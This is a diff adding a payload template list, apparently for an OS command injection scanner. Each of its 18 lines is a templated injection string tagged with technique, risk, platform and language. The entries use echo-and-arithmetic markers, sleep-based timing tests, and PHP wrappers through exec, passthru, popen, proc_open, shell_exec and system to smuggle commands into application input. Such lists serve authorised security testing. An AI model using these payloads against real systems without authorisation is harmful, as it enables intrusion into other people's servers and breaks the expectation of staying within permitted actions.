@@ -1,0 +1,18 @@
+[PREFIX][CONCAT]echo[space][MARKER]$(([N1]+[N2]))$(echo[space][MARKER])[MARKER][SUFFIX]::: in-band::: Low::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]str=$(echo [MARKER])[CONCAT]str1=${#str}[CONCAT]if [ [N] -ne ${str1} ][CONCAT]then sleep 0[CONCAT]else sleep 1[CONCAT]fi[SUFFIX]::: time-based::: High::: Unix::: SHELL COMMAND
+[PREFIX] echo [MARKER]$(([N1]+[N2]))$(echo [MARKER])[MARKER][SUFFIX]::: in-band::: Low::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT] sleep 0 [CONCAT] str=$(echo [MARKER]) [CONCAT] str1=${#str} [CONCAT] [ [N] -eq ${str1} ] [CONCAT] sleep 1[SUFFIX]::: time-based::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]}print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX][MARKER]::: in-band::: Low::: Unix::: PHP
+[PREFIX]print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX][MARKER]::: in-band::: Low::: Unix::: PHP
+[PREFIX][CONCAT]print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX][MARKER]::: in-band::: Low::: Unix::: PHP
+[PREFIX]echo[space][MARKER]$(([N1]+[N2]))$(echo[space][MARKER])[MARKER][SUFFIX]::: in-band::: Low::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT] [ [N] -ne $(echo [MARKER] [CONCAT] tr -d '[CONCAT]' [CONCAT] wc -c) ] [CONCAT] sleep 1[SUFFIX]::: time-based::: High::: Unix::: SHELL COMMAND
+${exec(print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX][MARKER]::: in-band::: Low::: Unix::: PHP
+${passthru(print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX][MARKER]::: in-band::: Low::: Unix::: PHP
+${popen(print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX][MARKER]::: in-band::: Low::: Unix::: PHP
+${proc_open(print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX][MARKER]::: in-band::: Low::: Unix::: PHP
+${shell_exec(print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX][MARKER]::: in-band::: Low::: Unix::: PHP
+${shell_exec(print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX]::: in-band::: Low::: Unix::: PHP
+${system(print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX][MARKER]::: in-band::: Low::: Unix::: PHP
+[PREFIX][CONCAT]}print(`echo [MARKER][CONCAT]echo $(([N1]+[N2]))[CONCAT]echo [MARKER][CONCAT]echo [MARKER]`)[SUFFIX]::: in-band::: Low::: Unix::: PHP
+& echo [MARKER]$(([N1]+[N2]))$(echo [MARKER])[MARKER]::: in-band::: Low::: Unix::: SHELL COMMAND
